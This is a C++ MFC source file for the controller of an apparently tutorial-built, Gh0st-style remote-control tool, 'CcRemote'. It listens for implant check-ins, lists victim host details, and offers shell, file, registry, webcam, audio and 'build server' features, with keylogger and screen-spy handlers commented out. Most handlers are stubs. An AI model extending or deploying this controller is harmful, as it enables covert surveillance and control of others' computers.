
// CcRemoteDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "CcRemote.h"
#include "CcRemoteDlg.h"
#include "afxdialogex.h"
#include "CSettingDlg.h"
#include "..\..\common\macros.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif


CCcRemoteDlg *g_pPCRemoteDlg = NULL;   //声明全局变量

CIOCPServer *m_iocpServer = NULL;
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CCcRemoteDlg 对话框



CCcRemoteDlg::CCcRemoteDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_CCREMOTE_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	//iCount = 0;
	g_pPCRemoteDlg = this;
	if (((CCcRemoteApp *)AfxGetApp())->m_bIsQQwryExist)//APP初始化会检查文件是否存在
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}
}

void CCcRemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CCcRemoteDlg, CDialogEx)
	//-------------自定义------------
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconNotify)
	ON_MESSAGE(WM_ADDTOLIST,OnAddToList)

	//-------------系统-------------
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CCcRemoteDlg::OnNMRClickOnline)
	ON_COMMAND(ID_ONLINE_AUDIO, &CCcRemoteDlg::OnOnlineAudio)
	ON_COMMAND(ID_ONLINE_CMD, &CCcRemoteDlg::OnOnlineCmd)
	ON_COMMAND(ID_ONLINE_DESKTOP, &CCcRemoteDlg::OnOnlineDesktop)
	ON_COMMAND(ID_ONLINE_FILE, &CCcRemoteDlg::OnOnlineFile)
	ON_COMMAND(ID_ONLINE_PROCESS, &CCcRemoteDlg::OnOnlineProcess)
	ON_COMMAND(ID_ONLINE_REGIST, &CCcRemoteDlg::OnOnlineRegist)
	ON_COMMAND(ID_ONLINE_SERVER, &CCcRemoteDlg::OnOnlineServer)
	ON_COMMAND(ID_ONLINE_VIDEO, &CCcRemoteDlg::OnOnlineVideo)
	ON_COMMAND(ID_ONLINE_WINDOW, &CCcRemoteDlg::OnOnlineWindow)
	ON_COMMAND(ID_ONLINE_DELETE, &CCcRemoteDlg::OnOnlineDelete)
	ON_COMMAND(IDM_MAIN_SET, &CCcRemoteDlg::OnMainSet)
	ON_COMMAND(IDM_MAIN_CLOSE, &CCcRemoteDlg::OnMainClose)
	ON_COMMAND(IDM_MAIN_BUILD, &CCcRemoteDlg::OnMainBuild)
	ON_COMMAND(IDM_MAIN_ABOUT, &CCcRemoteDlg::OnMainAbout)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CCcRemoteDlg 消息处理程序

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers
//NotifyProc是这个socket内核的核心  所有的关于socket 的处理都要调用这个函数
void CALLBACK CCcRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			//g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			//ProcessReceive(pContext);        //这里是有数据到来 但没有完全接收
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);       //这里时完全接收 处理发送来的数据 跟进    ProcessReceiveComplete
			break;
		}
	}
	catch (...) {}
}


//                             监听端口    最大上线个数
void CCcRemoteDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	// 开启IPCP服务器 最大连接  端口     查看NotifyProc回调函数  函数定义
	if (m_iocpServer->Initialize(NotifyProc, NULL, nMaxConnections, nPort))
	{

		char hostname[256];
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{
			for (int i = 0; ; i++)
			{
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if (host->h_addr_list[i] + host->h_length >= host->h_name)
					break;
				str += "/";
			}
		}

		str.Format("监听端口: %d成功", nPort);
		ShowMessage(true, str);
	}
	else
	{
		str.Format("监听端口: %d失败", nPort);
		ShowMessage(true, str);
	}

}

BOOL CCcRemoteDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	////////////////////////////////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////////////////////////////


	InitSystemMenu();//初始化系统托盘
	InitToolBar();//初始化工具栏按钮控件
	InitMyMenu();//初始化菜单控件
	InitList();//初始化列表控件
	InitStatusBar();//初始化状态栏控件
	//---------改变窗口大小触发动态调整-------|
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom += 20;
	MoveWindow(rect);
	//----------------------------------------|
	ListenPort();//监听端口
	Test();
	
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CCcRemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CCcRemoteDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CCcRemoteDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


//动态调整控件大小
void CCcRemoteDlg::OnSize(UINT nType, int cx, int cy)
{
	double dcx = cx;     //对话框的总宽度
	CDialogEx::OnSize(nType, cx, cy);

	if (SIZE_MINIMIZED == nType)//当窗口最小化避免大小为0造成崩溃直接返回
		return;

	if (m_CList_Online.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;			//列表的左坐标
		rc.top = 80;			//列表的上坐标
		rc.right = cx - 1;		//列表的右坐标
		rc.bottom = cy - 160;	//列表的下坐标
		m_CList_Online.MoveWindow(rc);

		for (int i = 0; i < COLUMN_ONLINE_COUNT; i++) {   //遍历每一个列
			double dd = m_Column_Online_Data[i].nWidth;     //得到当前列的宽度
			dd /= m_Column_Online_Width;                    //看一看当前宽度占总长度的几分之几
			dd *= dcx;                                      //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = dd;                                 //转换为int 类型
			m_CList_Online.SetColumnWidth(i, (lenth));      //设置当前的宽度
		}
	}
	if (m_CList_Message.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;			//列表的左坐标
		rc.top = cy - 156;		//列表的上坐标
		rc.right = cx - 1;		//列表的右坐标
		rc.bottom = cy - 20;		//列表的下坐标
		m_CList_Message.MoveWindow(rc);

		for (int i = 0; i < COLUMN_MESSAGE_COUNT; i++) {                   //遍历每一个列
			double dd = m_Column_Message_Data[i].nWidth;     //得到当前列的宽度
			dd /= m_Column_Message_Width;                    //看一看当前宽度占总长度的几分之几
			dd *= dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = dd;                                   //转换为int 类型
			m_CList_Message.SetColumnWidth(i, (lenth));        //设置当前的宽度
		}
	}

	if (m_wndStatusBar.m_hWnd != NULL) {    //当对话框大小改变时 状态条大小也随之改变
		CRect rc;
		rc.top = cy - 20;
		rc.left = 0;
		rc.right = cx;
		rc.bottom = cy;
		m_wndStatusBar.MoveWindow(rc);
		m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_POPOUT, cx - 10);
	}

	if (m_ToolBar.m_hWnd != NULL)              //工具条
	{
		CRect rc;
		rc.top = rc.left = 0;
		rc.right = cx;
		rc.bottom = 80;
		m_ToolBar.MoveWindow(rc);     //设置工具条大小位置
	}
	// TODO: 在此处添加消息处理程序代码
}


int CCcRemoteDlg::InitMyMenu()
{
	HMENU hmenu;
	hmenu = LoadMenu(NULL, MAKEINTRESOURCE(IDR_MENU_MAIN));  //载入菜单资源
	
	::SetMenu(this->GetSafeHwnd(), hmenu);                  //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());                    //显示菜单

	popup.LoadMenu(IDR_MENU_ONLINE);//载入菜单资源
	::MENUINFO lpcmi;
	m_brush.CreateSolidBrush(RGB(236, 153, 101));//颜色
	memset(&lpcmi, 0, sizeof(::LPCMENUINFO));
	lpcmi.cbSize = sizeof(MENUINFO);
	lpcmi.fMask =  MIM_APPLYTOSUBMENUS | MIM_BACKGROUND;
	lpcmi.hbrBack = (HBRUSH)m_brush.operator HBRUSH();
	::SetMenuInfo(popup, &lpcmi);

	return 0;
}


int CCcRemoteDlg::InitList()
{
	//设置list可选中
	m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	
	//计算控件宽度
	for (int i = 0; i < COLUMN_ONLINE_COUNT; i++)
	{
		m_CList_Online.InsertColumn(i, m_Column_Online_Data[i].title, LVCFMT_LEFT, m_Column_Online_Data[i].nWidth);
		m_Column_Online_Width += m_Column_Online_Data[i].nWidth;
	}
	for (int i = 0; i < COLUMN_MESSAGE_COUNT; i++)
	{
		m_CList_Message.InsertColumn(i, m_Column_Message_Data[i].title, LVCFMT_CENTER, m_Column_Message_Data[i].nWidth);
		m_Column_Message_Width += m_Column_Message_Data[i].nWidth;
	}

	return 0;
}


void CCcRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing, ClientContext*pContext)
{
	m_CList_Online.InsertItem(0, strIP);           //默认为0行  这样所有插入的新列都在最上面
	m_CList_Online.SetItemText(0, ONLINELIST_ADDR, strAddr);      //设置列的显示字符   这里 ONLINELIST_ADDR等 为第二节课中的枚举类型 用这样的方法
	m_CList_Online.SetItemText(0, ONLINELIST_COMPUTER_NAME, strPCName); //解决问题会避免以后扩展时的冲突
	m_CList_Online.SetItemText(0, ONLINELIST_OS, strOS);
	m_CList_Online.SetItemText(0, ONLINELIST_CPU, strCPU);
	m_CList_Online.SetItemText(0, ONLINELIST_VIDEO, strVideo);
	m_CList_Online.SetItemText(0, ONLINELIST_PING, strPing);
	ShowMessage(true, strIP + "主机上线");
}

void CCcRemoteDlg::ShowMessage(bool bIsOK, CString strMsg)
{
	CString strIsOK, strTime;
	CTime t = CTime::GetCurrentTime();
	strTime = t.Format("%H:%M:%S");
	if (bIsOK)
	{
		strIsOK = "执行成功";
	}
	else {
		strIsOK = "执行失败";
	}
	m_CList_Message.InsertItem(0, strIsOK);
	m_CList_Message.SetItemText(0, 1, strTime);
	m_CList_Message.SetItemText(0, 2, strMsg);


	CString strStatusMsg;
	if (strMsg.Find("上线") > 0)         //处理上线还是下线消息
	{
		m_OnlineCount++;
	}
	else if (strMsg.Find("下线") > 0)
	{
		m_OnlineCount--;
	}
	else if (strMsg.Find("断开") > 0)
	{
		m_OnlineCount--;
	}
	m_OnlineCount = (m_OnlineCount <= 0 ? 0 : m_OnlineCount);         //防止iCount 有-1的情况
	strStatusMsg.Format("已连接: %d", m_OnlineCount);
	m_wndStatusBar.SetPaneText(0, strStatusMsg);   //在状态条上显示文字

}


void CCcRemoteDlg::Test()
{
	ShowMessage(true, "软件初始化成功...");
	//AddList("192.168.0.1", "本机局域网", "CHANG", "Windows7", "2.2GHZ", "有", "123232");
	//AddList("192.168.10.1", "本机局域网", "WANG", "Windows10", "2.2GHZ", "无", "111111");
	//AddList("192.168.18.25", "本机局域网", "LIU", "Windows8", "2.2GHZ", "有", "654321");
	//AddList("192.168.97.162", "本机局域网", "SHANG", "WindowsXP", "2.2GHZ", "无", "123456");
	
}

void CCcRemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	
	CMenu*	pM = popup.GetSubMenu(0);//得到菜单项
	CPoint	p;
	GetCursorPos(&p);//得到鼠标指针的位置
	int	count = pM->GetMenuItemCount();//得到菜单的个数
	if (m_CList_Online.GetSelectedCount() == 0)       //如果没有选中
	{
		for (int i = 0; i < count; i++) //遍历每一个菜单
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //菜单全部变灰
		}
	}
	else
	{
		for (int i = 0; i < count; i++) //遍历每一个菜单
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_ENABLED );          //菜单可用
		}
	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this); //在指定位置显示菜单
	*pResult = 0;
}


void CCcRemoteDlg::OnOnlineAudio()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("声音");
}


void CCcRemoteDlg::OnOnlineCmd()
{
	// TODO: 在此添加命令处理程序代码
	MessageBox("CMD");
}


void CCcRemoteDlg::OnOnlineDesktop()
{
	// TODO: 在此添加命令处理程序代码
}


void CCcRemoteDlg::OnOnlineFile()
{
	// TODO: 在此添加命令处理程序代码
}


void CCcRemoteDlg::OnOnlineProcess()
{
	// TODO: 在此添加命令处理程序代码
}


void CCcRemoteDlg::OnOnlineRegist()
{
	// TODO: 在此添加命令处理程序代码
}


void CCcRemoteDlg::OnOnlineServer()
{
	// TODO: 在此添加命令处理程序代码
}


void CCcRemoteDlg::OnOnlineVideo()
{
	// TODO: 在此添加命令处理程序代码
}


void CCcRemoteDlg::OnOnlineWindow()
{
	// TODO: 在此添加命令处理程序代码
}


void CCcRemoteDlg::OnOnlineDelete()
{
	// TODO: 在此添加命令处理程序代码
	CString strIP;//选择断开的IP
	int iSelect = m_CList_Online.GetSelectionMark();//获得选中的行
	strIP = m_CList_Online.GetItemText(iSelect, ONLINELIST_IP);//获取断开的IP字符串
	m_CList_Online.DeleteItem(iSelect);//删除该列表项
	strIP += " 由主机主动断开连接";
	ShowMessage(true, strIP);//显示日志
}


void CCcRemoteDlg::OnMainSet()
{
	// TODO: 在此添加命令处理程序代码
	CSettingDlg MySettingDlg;
	MySettingDlg.DoModal();
}


void CCcRemoteDlg::OnMainClose()
{
	// TODO: 在此添加命令处理程序代码
	PostMessage(WM_CLOSE);
}


void CCcRemoteDlg::OnMainBuild()
{
	// TODO: 在此添加命令处理程序代码
}


void CCcRemoteDlg::OnMainAbout()
{
	// TODO: 在此添加命令处理程序代码
	CAboutDlg dlgAbout;
	dlgAbout.DoModal();
}


//状态栏数组
static UINT indicators[] =
{
IDR_STATUSBAR_STRING
};


//初始化状态栏
void CCcRemoteDlg::InitStatusBar()
{
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
			sizeof(indicators) / sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		TRACE0("Failed to create status bar\n");
		return;      // fail to create
	}
	CRect rc;
	::GetWindowRect(m_wndStatusBar.m_hWnd, rc);
	m_wndStatusBar.MoveWindow(rc);                              //移动状态条到指定位置
}


//初始化工具条按钮控件
void CCcRemoteDlg::InitToolBar()
{
	//创建工具条
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))//载入创建好的控件资源
	{
		TRACE0("Failed to create toolbar\n");
		return;      // fail to create
	}
	m_ToolBar.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	
	//加载位图资源
	m_ToolBar.LoadTrueColorToolBar
	(
		48,    //加载真彩工具条
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
	);
	RECT rt, rtMain;
	GetWindowRect(&rtMain);//获取窗口大小
	rt.left = 0;
	rt.top = 0;
	rt.bottom = 80;
	rt.right = rtMain.right - rtMain.left + 10;
	m_ToolBar.MoveWindow(&rt, TRUE);

	m_ToolBar.SetButtonText(0, "终端管理");
	m_ToolBar.SetButtonText(1, "进程管理");
	m_ToolBar.SetButtonText(2, "窗口管理");
	m_ToolBar.SetButtonText(3, "桌面管理");
	m_ToolBar.SetButtonText(4, "文件管理");
	m_ToolBar.SetButtonText(5, "语音管理");
	m_ToolBar.SetButtonText(6, "视频管理");
	m_ToolBar.SetButtonText(7, "服务管理");
	m_ToolBar.SetButtonText(8, "注册表管理");
	m_ToolBar.SetButtonText(10, "参数设置");
	m_ToolBar.SetButtonText(11, "生成服务端");
	m_ToolBar.SetButtonText(12, "帮助");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
}


//初始化工具条按钮控件
void CCcRemoteDlg::InitSystemMenu()
{
	/*
	   typedef struct _NOTIFYICONDATA {
    DWORD cbSize;			//结构体自身大小
    HWND hWnd;				//托盘的父窗口  托盘发出的消息由哪一个窗口响应
    UINT uID;				//显示图标的ID
    UINT uFlags;			//托盘的状态 (如有图标，有气泡提示，有消息响应等)
    UINT uCallbackMessage;	//托盘事件的消息响应函数
    HICON hIcon;            //图标的变量
    TCHAR szTip[64];        //气泡的显示文字
    DWORD dwState;          //图标的显示状态
    DWORD dwStateMask;      //图标的显示状态
    TCHAR szInfo[256];      //气泡的显示文字  (可以忽略)
    union {
        UINT uTimeout;
        UINT uVersion;
    };
    TCHAR szInfoTitle[64];
    DWORD dwInfoFlags;
    GUID guidItem;
    HICON hBalloonIcon;
} NOTIFYICONDATA, *PNOTIFYICONDATA;

	*/
	nid.cbSize = sizeof(nid);     //大小赋值
	nid.hWnd = m_hWnd;           //父窗口
	nid.uID = IDR_MAINFRAME;     //icon  ID
	nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;   //托盘所拥有的状态
	nid.uCallbackMessage = UM_ICONNOTIFY;            //回调消息
	nid.hIcon = m_hIcon;                            //icon 变量
	CString str = "CcRemote远程协助软件";       //气泡提示
	lstrcpyn(nid.szTip, (LPCSTR)str, sizeof(nid.szTip) / sizeof(nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &nid);   //显示托盘
}

void CCcRemoteDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	Shell_NotifyIcon(NIM_DELETE, &nid); //销毁图标
	CDialogEx::OnClose();
}


//托盘图标回调函数
void CCcRemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN: // click or dbclick left button on icon
	case WM_LBUTTONDBLCLK: // should show desktop
		if (!IsWindowVisible())
			ShowWindow(SW_SHOW);
		else
			ShowWindow(SW_HIDE);
		break;
	case WM_RBUTTONDOWN: // click right button, show menu
		CMenu menu;
		menu.LoadMenu(IDR_MENU_NOTIFY);
		CPoint point;
		GetCursorPos(&point);
		SetForegroundWindow();
		menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
			point.x, point.y, this, NULL);
		PostMessage(WM_USER, 0, 0);
		break;
	}
}



void CCcRemoteDlg::ListenPort()
{
	int	nPort = ((CCcRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");         //读取ini 文件中的监听端口
	int	nMaxConnection = ((CCcRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");   //读取最大连接数
	if (nPort == 0)
		nPort = 80;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	Activate(nPort, nMaxConnection);             //开始监听
}


void CCcRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];

	// 交给窗口处理
	/*if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}*/

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //如果没有赋值就判断是否是上线包和打开功能功能窗口
	{                                                           //讲解后回到ClientContext结构体
	/*case TOKEN_AUTH: // 要求验证
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;*/
	case TOKEN_LOGIN: // 上线包

	{
		//这里处理上线
		if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_Online.GetItemCount())
		{
			closesocket(pContext->m_Socket);
		}
		else
		{
			pContext->m_bIsMainSocket = true;
			g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
		}
		// 激活
		BYTE	bToken = COMMAND_ACTIVED;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
	}

	break;
	/*case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;*/
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}
}


LRESULT CCcRemoteDlg::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	CString strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing;
	
	//注意这里的  ClientContext  正是发送数据时从列表里取出的数据
	ClientContext	*pContext = (ClientContext *)lParam;    
	if (pContext == NULL)
		return -1;

	CString	strToolTipsText;
	try
	{
		//int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		// ID
		//CString	str;
		//str.Format("%d", m_nCount++);	

		// IP地址
		//int i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// 外网IP

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		//m_pListCtrl->SetItemText(i, 1, IPAddress);
		strIP = IPAddress;

		// 内网IP
		//m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));
		//strAddr=inet_ntoa(LoginInfo->IPAddress);
		// 主机名
		//m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);
		strPCName = LoginInfo->HostName;
		// 系统

		////////////////////////////////////////////////////////////////////////////////////////
		// 显示输出信息
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4)
				pszOS = "NT";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
				pszOS = "2000";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1)
				pszOS = "XP";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2)
				pszOS = "2003";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
				pszOS = "Vista";  // Just Joking
		}
		strOS.Format
		(
			"%s SP%d (Build %d)",
			//OsVerInfo.szCSDVersion,
			pszOS,
			LoginInfo->OsVerInfoEx.wServicePackMajor,
			LoginInfo->OsVerInfoEx.dwBuildNumber
		);
		//m_pListCtrl->SetItemText(i, 4, strOS);

		// CPU
		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
		//m_pListCtrl->SetItemText(i, 5, str);

		// Speed
		strPing.Format("%d", LoginInfo->dwSpeed);
		//m_pListCtrl->SetItemText(i, 6, str);


		strVideo = LoginInfo->bIsWebCam ? "有" : "--";
		//m_pListCtrl->SetItemText(i, 7, str);

		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);

		if (((CCcRemoteApp *)AfxGetApp())->m_bIsQQwryExist)
		{

			strAddr = m_QQwry->IPtoAdd(IPAddress);

			//strToolTipsText += "\nArea: ";
			//strToolTipsText += str;
		}
		// 指定唯一标识
		//m_pListCtrl->SetItemData(i, (DWORD) pContext);    //这里将服务端的套接字等信息加入列表中保存
		AddList(strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing, pContext);
	}
	catch (...) {}

	return 0;
}